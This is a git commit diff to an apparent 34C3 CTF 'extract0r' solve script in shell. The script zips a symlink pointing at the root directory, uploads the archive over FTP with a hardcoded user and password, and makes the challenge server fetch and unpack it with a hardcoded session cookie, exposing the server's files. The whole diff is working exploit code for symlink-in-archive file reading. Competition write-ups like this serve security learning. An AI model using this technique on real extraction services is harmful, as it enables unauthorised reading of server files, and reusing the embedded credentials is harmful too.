c21d793d7ec65db1bb8f732130487b3543941505
terjanq <terjanq@github.com>
2018-02-09 03:56:52 +0100

    Grid it

--- 34c3ctf/extract0r/e0.sh
+++ 34c3ctf/extract0r/e0.sh
@@ -7,8 +7,10 @@ ftp_user="ctfish@ctfish.cba.pl"
 ftp_passwd="Haslo123"
 php_ssid="PHPSESSID=rgmisfpqe7n9a6gubun94vcspb"
 read path
-ln -sf $path temp
-zip --symlinks $zipname temp
+# ln -sf $path temp
+# zip --symlinks $zipname temp
+ln -s / .AAA
+zip --symlink "test.zip" .AAA
 curl -T $zipname $ftp_serv --user $ftp_user:$ftp_passwd
 file=`curl "http://35.198.175.71/?url=http%3A%2F%2Fctfish.cba.pl%2F$zipname" -H "Cookie: $php_ssid" --compressed | grep -o 'files/[^"]*'`
 rm $zipname
